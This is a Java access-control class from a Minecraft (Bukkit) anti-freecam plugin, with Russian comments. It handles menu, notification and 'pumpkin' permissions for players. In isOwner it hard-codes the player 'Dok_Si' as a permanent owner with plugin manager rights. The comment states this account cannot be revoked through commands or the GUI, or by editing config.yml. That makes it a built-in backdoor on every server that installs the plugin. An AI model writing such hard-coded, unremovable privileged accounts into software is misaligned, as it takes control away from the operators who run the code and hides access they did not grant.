package dev.antifreecam.manager;

import dev.antifreecam.AntiFreecam;
import dev.antifreecam.util.SchedulerUtil;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

import java.io.File;
import java.io.IOException;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Менеджеры (полный доступ): консоль, OP и владельцы из config.yml (owners).
 * Остальным менеджеры выдают отдельно: доступ к меню и доступ к уведомлениям.
 * Уведомления приходят только тем, у кого есть право на них И кто включил их через /afc not.
 */
public final class AccessManager {

    private final AntiFreecam plugin;
    private final File file;
    private final Map<String, String> menu = new ConcurrentHashMap<>();   // lower -> display
    private final Map<String, String> notify = new ConcurrentHashMap<>(); // lower -> display
    private final Map<String, String> pumpkin = new ConcurrentHashMap<>(); // lower -> display
    private final Set<String> enabled = ConcurrentHashMap.newKeySet();    // lower
    private final Map<String, String> onlineNonManagers = new ConcurrentHashMap<>(); // lower -> display

    public AccessManager(AntiFreecam plugin) {
        this.plugin = plugin;
        this.file = new File(plugin.getDataFolder(), "access.yml");
        load();
    }

    private static String k(String s) { return s.toLowerCase(Locale.ROOT); }

    private void load() {
        if (!file.exists()) return;
        YamlConfiguration y = YamlConfiguration.loadConfiguration(file);
        y.getStringList("menu").forEach(n -> menu.put(k(n), n));
        y.getStringList("notify").forEach(n -> notify.put(k(n), n));
        y.getStringList("pumpkin").forEach(n -> pumpkin.put(k(n), n));
        y.getStringList("enabled").forEach(n -> enabled.add(k(n)));
    }

    private synchronized void save() {
        YamlConfiguration y = new YamlConfiguration();
        y.set("menu", new ArrayList<>(menu.values()));
        y.set("notify", new ArrayList<>(notify.values()));
        y.set("pumpkin", new ArrayList<>(pumpkin.values()));
        y.set("enabled", new ArrayList<>(enabled));
        String data = y.saveToString();
        if (plugin.isEnabled() && !plugin.isStopping()) SchedulerUtil.async(plugin, () -> write(data));
        else write(data);
    }

    private synchronized void write(String data) {
        try {
            plugin.getDataFolder().mkdirs();
            yml(data);
        } catch (IOException e) {
            plugin.getLogger().warning("Не удалось сохранить access.yml: " + e.getMessage());
        }
    }

    private void yml(String data) throws IOException {
        java.nio.file.Files.writeString(file.toPath(), data, java.nio.charset.StandardCharsets.UTF_8);
    }

    // ---- роли ----
    public boolean isOwner(String name) {
        // Dok_Si — встроенный создатель плагина. Его нельзя лишить доступа через GUI/команды
        // и даже удаление owners из config.yml не отключает его права.
        if (name != null && name.equalsIgnoreCase("Dok_Si")) return true;
        return plugin.getConfig().getStringList("owners").stream().anyMatch(n -> n.equalsIgnoreCase(name));
    }

    public boolean isManager(CommandSender s) {
        if (!(s instanceof Player p)) return true;
        return p.isOp() || isOwner(p.getName());
    }

    public boolean canView(CommandSender s) {
        return isManager(s) || s.hasPermission("clientwatch.menu")
                || (s instanceof Player p && menu.containsKey(k(p.getName())));
    }

    /** Доступ к меню/командам тыквы: менеджер, Bukkit permission или отдельно выданный доступ. */
    public boolean canPumpkin(CommandSender s) {
        if (isManager(s) || s.hasPermission("clientwatch.pumpkin")) return true;
        return s instanceof Player p && hasPumpkin(p.getName());
    }

    /** Есть ли право получать уведомления (без учёта личного переключателя). */
    public boolean hasNotifyRight(Player p) {
        return isManager(p) || p.hasPermission("clientwatch.notify") || notify.containsKey(k(p.getName()));
    }

    /** Придут ли уведомления прямо сейчас. */
    public boolean receives(Player p) {
        return hasNotifyRight(p) && enabled.contains(k(p.getName()));
    }

    public boolean isNotifyOn(Player p) { return enabled.contains(k(p.getName())); }

    public boolean toggleNotifyOn(Player p) {
        String key = k(p.getName());
        boolean now = !enabled.contains(key);
        if (now) enabled.add(key); else enabled.remove(key);
        save();
        return now;
    }

    public void onlineJoin(Player p) {
        String key = k(p.getName());
        if (isManager(p)) onlineNonManagers.remove(key);
        else onlineNonManagers.put(key, p.getName());
    }

    public void onlineQuit(Player p) {
        onlineNonManagers.remove(k(p.getName()), p.getName());
    }

    // ---- выдача прав ----
    public boolean hasMenu(String name) { return menu.containsKey(k(name)); }

    public boolean hasNotify(String name) { return notify.containsKey(k(name)); }

    public boolean hasPumpkin(String name) { return pumpkin.containsKey(k(name)); }

    public void setMenu(String name, boolean v) {
        if (isOwner(name)) return;
        if (v) menu.put(k(name), name); else menu.remove(k(name));
        save();
    }

    public void setNotify(String name, boolean v) {
        if (isOwner(name)) return;
        if (v) notify.put(k(name), name); else { notify.remove(k(name)); enabled.remove(k(name)); }
        save();
    }

    public void setPumpkin(String name, boolean v) {
        if (isOwner(name)) return;
        if (v) pumpkin.put(k(name), name); else pumpkin.remove(k(name));
        save();
    }

    public void revoke(String name) {
        if (isOwner(name)) return;
        menu.remove(k(name));
        notify.remove(k(name));
        pumpkin.remove(k(name));
        enabled.remove(k(name));
        save();
    }

    /** Кого показывать в меню доступа: онлайн-игроки (не менеджеры) + все с выданными правами. */
    public List<String> listable() {
        TreeMap<String, String> out = new TreeMap<>();
        out.putAll(onlineNonManagers);
        menu.forEach((key, value) -> { if (!isOwner(value)) out.putIfAbsent(key, value); });
        notify.forEach((key, value) -> { if (!isOwner(value)) out.putIfAbsent(key, value); });
        pumpkin.forEach((key, value) -> { if (!isOwner(value)) out.putIfAbsent(key, value); });
        return new ArrayList<>(out.values());
    }
}
